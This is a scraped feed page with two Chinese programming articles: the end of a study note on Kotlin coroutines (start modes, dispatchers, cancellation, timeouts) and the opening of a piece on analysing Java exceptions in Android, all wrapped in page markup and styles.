                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>种一颗树的最好时机是十年前，其次是现在。
学习也一样。
跟着霍老师的《深入理解 Kotlin 携程》学习一下协程。</p>
<h2 data-id="heading-0">前言</h2>
<p>按照书中的顺序学习感觉不是很流程，看到第五章觉得这个顺序不太适合自己，
因此学习的顺序颠倒一下，先看第六章《Kotlin协程的官放框架》，然后是第七章《Kotlin协程在Android上的应用》，最后在学习第五章《Kotlin协程框架开发初探》</p>
<h2 data-id="heading-1">协程框架概述</h2>
<h3 data-id="heading-2">构成</h3>
<p>Kotlin协程的官方框架kotlinx.coroutines是一套独立于标准库之外的以生产为目的的框架，提供了丰富的API来支撑生产环境中一步程序的设计和实现，主要由以下几部分构成</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72b544a02f1a40f9a87d09bcafdbec4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSHVhbmflhYQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767841648&amp;x-signature=8tKhdHRpqCcepLeWcL4lFW0phkA%3D" alt="官方协程框架的结构.png" loading="lazy"/></p>
<ul>
<li>core:框架的核心逻辑，包括创建、调度、取消、channel、flow等</li>
<li>ui:包括Android，javafx,swing三个库，用于提供各平台的UI调度器和一些特殊的逻辑</li>
<li>reactive相关：提供对各种响应式编程框架的支持，
<ul>
<li>reactive</li>
<li>reactor</li>
<li>rx2</li>
</ul>
</li>
<li>integration：提供与其他框架的异步回调集成
<ul>
<li>jdk8</li>
<li>guava</li>
<li>slf4j</li>
<li>play-services</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">启动模式</h3>
<p>启动模式总共四种，</p>
<ul>
<li>DEFAULT
<ul>
<li>会立即根据上下文调度协程执行，也就是立即开始调度，再调度前如果携程被取消，其将直接进入取消响应状态</li>
</ul>
</li>
<li>LAZY
<ul>
<li>只有携程被需要时，包括主动调用协程的start、join或者await登函数时猜会开始调用度，如果调度前就别取消，那么协程将直接进入异常结束状态</li>
</ul>
</li>
<li>ATOMIC
<ul>
<li>协程创建后，立即开始调度，协程执行到第一个挂起点之前不响应取消</li>
</ul>
</li>
<li>UNDISPATCHED
<ul>
<li>协程创建后立即在当前函数调用栈中执行，直到遇到第一个真正的挂起点</li>
</ul>
</li>
</ul>
<p>首先要弄清楚立即调度和立即执行的区别。立即调度表示协程的调度器会立即接收到调度指令，但具体执行的时机以及在哪个线程上执行，还需要根据调度器的具体情况而定，也就是谁立即调用到立即执行之间通常会有一段时间。因此我们可以得出一下结论</p>
<ul>
<li>DEFAULT虽然是立即调度，但也有可能在执行前被取消</li>
<li>UNDISPATCHED是立即执行，因此协程一定会执行</li>
<li>ATOMIC虽然是立即调度，但其调度和执行两个步骤合成了一个，保证调度和执行是原子操作，因此协程也一定会执行</li>
<li>UNDISPATCHED和ATOMIC虽然都会保证协程一定执行，但在第一个挂起点之前前者运行在协程创建时所在的线程，后者则会调度到制定的调度器所在的线程上执行</li>
</ul>
<h3 data-id="heading-4">调度器</h3>
<p>官方预置了4个调度器，我们可以通过Dispatchers对象访问他们。</p>
<ul>
<li>Default：默认调度器，适合处理后台计算，其是一个CPU密集型任务调度器。</li>
<li>IO：IO调度器，适合执行IO相关操作，其是一个IO密集型任务调度器。</li>
<li>Main：UI调度器，根据平台的不同会被初始化为对应的UI线程的调度器。</li>
<li>Unconfined：“无所谓”调度器，不要求协程执行在特定线程上。</li>
</ul>
<h3 data-id="heading-5">协程的取消检查</h3>
<p>我们已经知道挂起函数可以通过suspendCancellableCoroutine来相应所在线程的取消状态，我们在设计异步任务时，异步任务的取消响应点可能就在这些挂起点处。但如果没有挂起点呢？比如标准库中提供的扩展函数 InputStream.copyTo,使用Java BIO来完成。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> InputStream.<span class="hljs-title">copyTo</span><span class="hljs-params">(<span class="hljs-keyword">out</span>: <span class="hljs-type">OutputStream</span>, bufferSize: <span class="hljs-type">Int</span> = DEFAULT_BUFFER_SIZE)</span></span>: <span class="hljs-built_in">Long</span> {
    <span class="hljs-keyword">var</span> bytesCopied: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">val</span> buffer = ByteArray(bufferSize)
    <span class="hljs-keyword">var</span> bytes = read(buffer)
    <span class="hljs-keyword">while</span> (bytes &gt;= <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">out</span>.write(buffer, <span class="hljs-number">0</span>, bytes) 
        bytesCopied += bytes
        bytes = read(buffer)
    }
    <span class="hljs-keyword">return</span> bytesCopied
}
</code></pre>
<p>将这段程序放入协程中之后，就会发现协程的取消状态对它没有任何影响。我们首先想到的是在while循环中添加一个对所在协程的isActive的判断。但实际上官方协程框架还提供了yield函数</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> InputStream.<span class="hljs-title">copyTo</span><span class="hljs-params">(<span class="hljs-keyword">out</span>: <span class="hljs-type">OutputStream</span>, bufferSize: <span class="hljs-type">Int</span> = DEFAULT_BUFFER_SIZE)</span></span>: <span class="hljs-built_in">Long</span> {
    ...
    <span class="hljs-keyword">while</span> (bytes &gt;= <span class="hljs-number">0</span>) {
        yield()
    ...
    }
    <span class="hljs-keyword">return</span> bytesCopied
}
</code></pre>
<p>yield函数的作用主要是检查所在线程的状态，如果已经取消，则抛出取消异常予以响应。此外它还会尝试让出线程的执行权，给其他协程提供执行的机会。</p>
<h3 data-id="heading-6">协程的超时取消</h3>
<p>在网络请求中， 我们可能会有一些特定的接口需要在短时间内没有响应就要取消，这个时间比我们通用配置的时间要短，这种情况下我们就可以使用withTimeout来实现</p>
<pre><code class="hljs language-kotlin" lang="kotlin">GlobalScope.launch {
    <span class="hljs-keyword">val</span> user = withTimeout(<span class="hljs-number">1000</span>){
        ....
    }
}
</code></pre>
<p>如果withTimeout的第二个参数block运行超时，那么就会被取消，取消后withTimeout直接抛出取消异常。如果不希望抛出异常，也可以使用withTimeoutOrNull,它的效果是在超时的情况下返回null。</p>
<hr/>
<p>以上</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[稳定性性能系列之六——Java异常与JE分析实战]]></title>    <link>https://juejin.cn/post/7589893170387550208</link>    <guid>https://juejin.cn/post/7589893170387550208</guid>    <pubDate>2026-01-01T03:05:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893170387550208" data-draft-id="7589930672832626723" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="稳定性性能系列之六——Java异常与JE分析实战"/> <meta itemprop="keywords" content="Android,性能优化,Debug"/> <meta itemprop="datePublished" content="2026-01-01T03:05:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            稳定性性能系列之六——Java异常与JE分析实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:05:06.000Z" title="Thu Jan 01 2026 03:05:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Java异常与JE分析实战</h2>
<blockquote>
<p>Java异常虽然比Native Crash更容易分析,但要做到快速定位、高效解决,仍需要掌握系统化的方法和工具链。</p>
</blockquote>
<h3 data-id="heading-1">引言</h3>
<p>在Android应用开发中,Java异常是最常见的稳定性问题之一。虽然Java异常提供了完整的堆栈信息,但在实际生产环境中,面对海量日志和复杂的调用链,快速定位问题根因仍然具有挑战性。</p>
<p>以一次线上问题为例:监控平台显示Crash率突然上升,异常信息为<code>NullPointerException at CarPropertyManager.getProperty()</code>。该问题仅在特定车型上出现,本地环境无法复现。通过DropBox日志分析、源码追踪和远程调试,最终定位为配置文件缺失导致的空指针问题。</p>
<p>这个案例说明:<strong>Java异常虽然有完整的堆栈信息,但如果缺乏系统化的分析方法和工具链,依然会在海量日志中迷失方向。</strong></p>
<p>本文将深入介绍Java异常的分析实战,从异常机制到日志分析,从工具使用到真实案例,建立完整的Java层问题排查方法论。读完本文,你将能够:</p>
<ol>
<li>理解Java异常体系和Android异常处理机制</li>
<li>掌握JE (Java Exception) 日志的结构和分析方法</li>
<li>熟练使用Logcat进行实时异常监控</li>
<li>学会使用DropBox提取和分析历史异常</li>
<li>掌握MAT工具分析内存相关异常</li>
<li>建立系统化的Java异常排查流程</li>
</ol>
<hr/>
<h3 data-id="heading-2">一、Java异常机制基础</h3>
<p>在深入工具实战之前,让我们先建立对Java异常的完整认知。</p>
<h4 data-id="heading-3">1.1 Java异常体系</h4>
<p>Java的异常体系是一个精心设计的层次结构,所有异常类都继承自<code>Throwable</code>:</p>
<pre><code class="hljs language-java" lang="java">Throwable
├── Error (严重错误,程序无法处理)
│   ├── OutOfMemoryError (OOM)
│   ├── StackOverflowError (栈溢出)
│   ├── VirtualMachineError
│   └── ...
└── Exception (可处理的异常)
    ├── RuntimeException (运行时异常,Unchecked)
    │   ├── NullPointerException (空指针)
    │   ├── IndexOutOfBoundsException (越界)
    │   ├── ClassCastException (类型转换)
    │   ├── IllegalArgumentException (非法参数)
    │   └── ...
    └── Checked <span class="hljs-title function_">Exception</span> <span class="hljs-params">(编译时检查)</span>
        ├── IOException
        ├── SQLException
        └── ...
</code></pre>
<p><strong>Error vs Exception</strong>:</p>
<ul>
<li><strong>Error</strong>: 系统级错误,程序无法恢复(如OOM、StackOverflowError)</li>
<li><strong>Exception</strong>: 应用级异常,程序可以捕获和处理</li>
</ul>
